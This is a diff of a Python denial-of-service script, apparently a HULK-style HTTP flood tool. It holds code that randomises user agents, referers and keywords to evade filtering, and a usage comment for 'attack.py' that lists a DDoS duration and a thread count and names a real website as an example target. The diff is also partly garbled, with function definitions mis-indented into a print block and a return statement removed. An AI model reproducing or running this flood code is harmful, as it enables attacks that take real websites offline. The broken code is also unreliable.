@@ -1,75 +1,21 @@
-import random
-import socket
-import threading
-import time
-import datetime
-import urllib2
-import urllib
+import os
 import re
 import sys
-import optparse
-import os
-import urlparse
+import time
+import signal
+import socket
+import getopt
+import random
+import urllib
+import threading
 
-#assasin trea Xsarjame :v
-url=''
-host=''
-headers_useragents=[]
-headers_referers=[]
-keyword_top=[]
-request_counter=0
-flag=0
-safe=0
-def inc_counter():
-	global request_counter
-	request_counter+=1
+def usage():
+	# print ''' usage : python attack.py [-t] [-c] http://www.zhihu.com/
+	# -h : help
+	# -t : lasting time of ddos
+	# -c : numbers of thread to create'''
 
-def set_flag(val):
-	global flag
-	flag=val
-	
-def set_safe():
-	global safe
-	safe=1
-
-def getUserAgent():
-    platform = random.choice(['Macintosh', 'Windows', 'X11'])
-    if platform == 'Macintosh':
-        os  = random.choice(['68K', 'PPC'])
-    elif platform == 'Windows':
-        os  = random.choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win95', 'Win98', 'Win 9x 4.90', 'WindowsCE', 'Windows 7', 'Windows 8'])
-    elif platform == 'X11':
-        os  = random.choice(['Linux i686', 'Linux x86_64'])
-    browser = random.choice(['chrome', 'firefox', 'ie'])
-    if browser == 'chrome':
-        webkit = str(random.randint(500, 599))
-        version = str(random.randint(0, 28)) + '.0' + str(random.randint(0, 1500)) + '.' + str(random.randint(0, 999))
-        return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
-    elif browser == 'firefox':
-        currentYear = datetime.date.today().year
-        year = str(random.randint(2000, currentYear))
-        month = random.randint(1, 12)
-        if month < 10:
-            month = '0' + str(month)
-        else:
-            month = str(month)
-        day = random.randint(1, 30)
-        if day < 10:
-            day = '0' + str(day)
-        else:
-            day = str(day)
-        gecko = year + month + day
-        version = str(random.randint(1, 21)) + '.0'
-        return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
-    elif browser == 'ie':
-        version = str(random.randint(1, 10)) + '.0'
-        engine = str(random.randint(1, 5)) + '.0'
-        option = random.choice([True, False])
-        if option == True:
-            token = random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
-        else:
-            token = ''
-        return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'
+	sys.exit()
 
 # generates a user agent array
 def useragent_list():
@@ -3622,53 +3568,6 @@ def keyword_list():
         keyword_top.append('face')
         keyword_top.append('spyware')
         keyword_top.append('you tube')
-        keyword_top.append('free tv shows')
-        keyword_top.append('downloads')
-        keyword_top.append('google maps')
-        keyword_top.append('websbiggest')
-        keyword_top.append('macromedia flash player free download')
-        keyword_top.append('m nova')
-        keyword_top.append('facebook friends')
-        keyword_top.append('phentermine')
-        keyword_top.append('weather')
-        keyword_top.append('watch online')
-        keyword_top.append('medical insurance')
-        keyword_top.append('dating websites')
-        keyword_top.append('in')
-        keyword_top.append('movies online')
-        keyword_top.append('friv')
-        keyword_top.append('search')
-        keyword_top.append('alo')
-        keyword_top.append('houses for rent by owner')
-        keyword_top.append('of')
-        keyword_top.append('internet marketing')
-        keyword_top.append('blogging make money')
-        keyword_top.append('make money blogging')
-        keyword_top.append('game')
-        keyword_top.append('movie2k')
-        keyword_top.append('walmart stores')
-        keyword_top.append('credit card')
-        keyword_top.append('instagram')
-        keyword_top.append('Insurance')
-        keyword_top.append('Loans')
-        keyword_top.append('Mortgage')
-        keyword_top.append('Attorney')
-        keyword_top.append('Credit')
-        keyword_top.append('Lawyer')
-        keyword_top.append('Donate')
-        keyword_top.append('Degree')
-        keyword_top.append('Hosting')
-        keyword_top.append('Claim')
-        keyword_top.append('Conference Call')
-        keyword_top.append('Trading')
-        keyword_top.append('Software')
-        keyword_top.append('Recovery')
-        keyword_top.append('Transfer')
-        keyword_top.append('Classes')
-        keyword_top.append('Rehab')
-        keyword_top.append('Treatment')
-        keyword_top.append('Cord Blood')
-	return(keyword_top)
 	
 print \
 """
@@ -3724,41 +3623,7 @@ print \
 """""""""
 		 
 
-	def usage():
-	# print ''' usage : python attack.py [-t] [-c] http://www.zhihu.com/
-	# -h : help
-	# -t : lasting time of ddos
-	# -c : numbers of thread to create'''
-
-	sys.exit()
-
-# generates a user agent array
-def useragent_list():
-	global headers_useragents
-	headers_useragents = []
-	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
-	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
-	return(headers_useragents)
-
-# generates a referer array
-def referer_list():
-	global headers_referers
-	headers_referers = []
-	headers_referers.append('http://www.usatoday.com/search/results?q=')
-	headers_referers.append('http://engadget.search.aol.com/search?q=')
-	headers_referers.append('http://' + host + '/')
-	return(headers_referers)
-
-def handler(signum,_):
+	def handler(signum,_):
 	# if signum == signal.SIGALRM:
 		# print 'Time is up'
 		# print 'Attack finished '
